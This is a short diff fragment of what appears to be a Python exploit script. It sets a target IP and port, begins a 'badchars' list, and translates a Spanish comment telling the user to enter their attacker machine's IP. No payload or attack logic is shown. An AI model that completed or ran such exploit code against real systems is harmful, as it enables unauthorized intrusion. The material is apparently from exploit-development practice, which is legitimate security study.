@@ -2,7 +2,7 @@
 import sys
 import socket
 
-ip = "10.0.2.7" # CAMBIA ESTO y pon la ip de tu pc atacante aqui
+ip = "10.0.2.7" # CHANGE THIS - put your attacker machine IP here
 port = 9999
 
 badchars = (
